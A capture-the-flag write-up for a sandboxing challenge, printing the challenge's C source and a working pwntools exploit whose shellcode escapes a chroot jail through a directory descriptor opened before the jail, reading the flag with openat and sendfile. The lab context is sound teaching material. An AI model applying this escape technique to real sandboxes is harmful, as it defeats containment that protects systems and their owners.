#metadata(
  (
    title: "Escaping via Pre-opened File Descriptor",
    description: "Writeup for Sandboxing Level 2",
    date: "2026-01-01",
    order: 2,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Escaping via Pre-opened File Descriptor

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    // Checking to make sure you're not trying to open the flag.
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

The vulnerability lies in the fact that the program opens a file specified by the user (`argv[1]`) *before* applying the sandbox restrictions (chroot). File descriptors opened before a `chroot` call remain open and accessible inside the jail.

```c
int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
// ...
assert(chroot(jail_path) == 0);
```

By passing `/` as the argument, we can cause the program to hold a file descriptor (likely FD 3) that points to the real root directory of the host system.

== Exploitation Plan

1.  **Leak the Root FD:** Run the challenge binary with `/` as the first argument. This will open the root directory and assign it to a file descriptor.
2.  **Bypass Chroot:** Since we have a handle to the real root directory, we can use the `openat` syscall. `openat` works like `open`, but it takes a directory file descriptor as a starting point.
3.  **Read the Flag:** We will use `openat(3, "flag", ...)` to open the real flag file relative to the leaked root FD.
4.  **Output:** Finally, we read the content of the flag and write it to stdout (FD 1).

== Exploit Script

```python
from pwn import *

# Set up the target
exe = "./challenge"
context.binary = exe

# Start the process with '/' as the argument to leak the root FD
p = process([exe, "/"])

# Assembly shellcode to read the flag using the leaked FD (3)
shellcode = asm("""
    /* openat(3, "flag", O_RDONLY) */
    mov rdi, 3              /* dirfd: 3 (the leaked root FD) */
    lea rsi, [rip + flag]   /* pathname: "flag" */
    xor rdx, rdx            /* flags: O_RDONLY */
    mov rax, 257            /* syscall: SYS_openat */
    syscall

    /* sendfile(1, fd, 0, 100) */
    mov rsi, rax            /* in_fd: result from openat */
    mov rdi, 1              /* out_fd: stdout */
    xor rdx, rdx            /* offset: 0 */
    mov r10, 100            /* count: 100 */
    mov rax, 40             /* syscall: SYS_sendfile */
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

flag:
    .string "flag"
""")

# Send the shellcode
p.send(shellcode)

# Receive the flag
p.interactive()
```
